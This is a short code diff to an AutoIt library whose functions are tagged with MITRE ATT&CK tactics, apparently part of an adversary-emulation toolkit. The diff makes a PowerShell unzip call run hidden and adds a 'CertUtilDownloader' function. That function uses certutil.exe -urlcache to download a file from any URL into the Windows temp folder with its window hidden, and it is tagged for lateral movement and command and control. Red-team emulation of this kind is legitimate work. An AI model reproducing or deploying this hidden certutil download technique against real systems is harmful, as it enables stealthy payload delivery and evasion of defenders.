@@ -328,5 +328,9 @@ Func ReadFile($sFilePath);DESCRIPTION:open a file and get content to a variable;
 EndFunc
 
 Func Unzip($source,$destination);DESCRIPTION:unzip;MITRE:-
-   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force" & " " & $source & " " & $destination)
+   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force" & " " & $source & " " & $destination, "", @SW_HIDE)
+EndFunc
+
+Func CertUtilDownloader($url, $fname) ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
+	RunWait("certutil.exe -urlcache -f " & $url & " C:\WINDOWS\TEMP\" & $fname,"" ,@SW_HIDE)
 EndFunc
